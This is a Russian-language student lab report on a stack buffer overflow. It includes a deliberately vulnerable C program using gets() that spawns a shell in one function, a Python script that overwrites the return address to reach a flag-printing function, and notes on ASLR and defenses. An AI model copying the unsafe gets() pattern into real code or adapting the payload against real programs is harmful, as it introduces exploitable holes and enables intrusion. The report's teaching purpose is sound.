ОТЧЕТ О ВЫПОЛНЕНИИ ЛАБОРАТОРНОЙ РАБОТЫ ПО БИНАРНОЙ ЭКСПЛУАТАЦИИ

Тема: Разработка простого эксплойта переполнения буфера
Студент: Шмарихин Дмитрий Дмитриевич

1. ВВЕДЕНИЕ
-----------
В данной лабораторной работе мы изучали технику переполнения буфера и создания 
эксплойта для получения доступа к защищенным функциям в программе.

2. УЯЗВИМАЯ ПРОГРАММА
---------------------
Для демонстрации уязвимости, мы создали следующую программу на C:

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret() {
    printf("Access granted! Exploit successful.\n");
    system("/bin/sh");
}

void another_secret() {
    printf("Another secret function accessed!\n");
    printf("Flag: CTF{b1n4ry_3xpl0it_m4st3r}\n");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // уязвимая функция
    printf("Hello, %s\n", buffer);
}

int main() {
    printf("Binary Exploitation Demo\n");
    printf("------------------------\n");
    printf("warning: this program uses gets(), which is unsafe.\n");
    printf("Address of secret function: %p\n", secret);
    printf("Address of another_secret function: %p\n", another_secret);
    vulnerable();
    return 0;
}

Уязвимость в данной программе заключается в использовании функции gets(),
которая не проверяет размер входных данных и может привести к переполнению
буфера. При вводе длинной строки, мы можем перезаписать адрес возврата
функции и перенаправить выполнение программы на функцию another_secret().

3. РАЗРАБОТКА ЭКСПЛОЙТА
-----------------------
Для эксплойта уязвимости мы создали скрипт на Python:

#!/usr/bin/env python3
import struct

# Адреса функций, полученные при запуске программы
# Адреса будут отличаться при каждом запуске из-за ASLR
secret_addr = 0x100ae4460
another_secret_addr = 0x100ae4488

# Создаем полезную нагрузку
offset = 80  # Экспериментально определенное смещение
payload = b"A" * offset
payload += struct.pack("<Q", another_secret_addr)  # 8 байт для 64-битного адреса

# Записываем полезную нагрузку в файл
with open("exploit_input", "wb") as f:
    f.write(payload)

print(f"[+] Эксплойт создан")
print(f"[+] Используемый адрес: 0x{another_secret_addr:x}")
print(f"[+] Запустите: ./vuln < exploit_input")

4. ПРОБЛЕМЫ И РЕШЕНИЯ
---------------------
При работе над эксплойтом возникли следующие проблемы:

1. ASLR (Address Space Layout Randomization) - защитный механизм операционной
   системы, который случайным образом размещает адресное пространство процесса.
   Это усложняет эксплуатацию, так как адреса функций меняются при каждом
   запуске программы.

2. Архитектура ARM64 имеет особенности выравнивания стека, которые усложняют
   точное определение смещения для эксплойта.

Для решения этих проблем мы модифицировали программу, чтобы она выводила
адреса функций во время запуска, что позволяет создавать эксплойт,
адаптированный к текущим адресам.

5. РЕЗУЛЬТАТ
------------
Успешная эксплуатация уязвимости позволяет получить доступ к функции
another_secret() и извлечь секретный флаг: CTF{b1n4ry_3xpl0it_m4st3r}.

6. ЗАЩИТНЫЕ МЕРЫ
----------------
Чтобы защитить программу от подобных уязвимостей, рекомендуется:

1. Не использовать небезопасные функции, такие как gets(). Вместо этого
   использовать fgets() с ограничением размера ввода.

2. Включить защиту стека при компиляции (-fstack-protector).

3. Использовать ASLR и другие защитные механизмы операционной системы.

4. Регулярно проводить аудит кода на наличие уязвимостей.

7. ЗАКЛЮЧЕНИЕ
-------------
В ходе данной лабораторной работы мы успешно разработали и применили эксплойт
переполнения буфера для получения доступа к защищенной функции программы.
Это демонстрирует важность понимания механизмов безопасности и тщательного 
программирования для предотвращения подобных уязвимостей в реальных
приложениях. 